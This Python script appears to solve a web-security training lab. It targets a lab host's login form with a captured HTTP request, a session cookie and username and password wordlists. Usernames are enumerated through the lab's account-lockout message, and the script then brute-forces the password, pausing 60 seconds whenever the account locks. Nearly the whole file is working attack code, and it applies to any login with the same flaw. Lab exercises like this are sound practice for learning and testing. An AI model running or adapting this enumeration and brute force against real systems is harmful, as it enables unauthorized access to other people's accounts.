import time
import sys
from custom.burprequest import BurpReq
import re

from enum_via_timing import ERROR

ERROR = "Invalid username or password"
MANY_LOGINS = "You have made too many incorrect login attempts"

usernames = open("usernames", 'r').readlines()
passwords = open("passwords", 'r').readlines()
usernames = tuple(map(lambda each: each.strip(), usernames))
passwords = tuple(map(lambda each: each.strip(), passwords))

valid_user = ''

burp_request = """POST /login HTTP/1.1
Host: acec1fc51f251e89c0511be7001c00ea.web-security-academy.net
Cookie: session=baOQgubhbn93Sv31s3P9D0AiahUtyg85
Content-Length: 29
Cache-Control: max-age=0
Sec-Ch-Ua: ";Not A Brand";v="99", "Chromium";v="94"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://acec1fc51f251e89c0511be7001c00ea.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://acec1fc51f251e89c0511be7001c00ea.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

"""

class Found(Exception): pass

def FindUser():
	global  valid_user
	for i in usernames:
		print(i)
		for _ in range(5):
			req = BurpReq(
				burp_request + f"username={i}&password=lmfao", 
				debug=False
			)
			res = req.MakeRequest()
			if re.search(ERROR, res.text):
				print('\terror')
			elif re.search(MANY_LOGINS, res.text):
				valid_user = i
				print('Correct user ==>', valid_user)
			else:
				print('internal error')
				sys.exit()

def FindPass(user, passw:list):
	for p in passw:
		req = BurpReq(
			burp_request +  f"username={user}&password={p}",
			debug=False
		)
		res = req.MakeRequest()

		if re.search(MANY_LOGINS, res.text):
			time.sleep(60)
			FindPass(user, passw[ passw.index(p) + 1 : ])
			

		if re.search(ERROR, res.text):
			print(p, "wrong!", res.status_code)
		else:
			print("Found password ==>", p)
			print(f"{user}:{p}")
			# print(res.text)
			sys.exit()



def Main():
	FindUser()
	FindPass(valid_user, passwords)

if __name__ == "__main__":
	Main()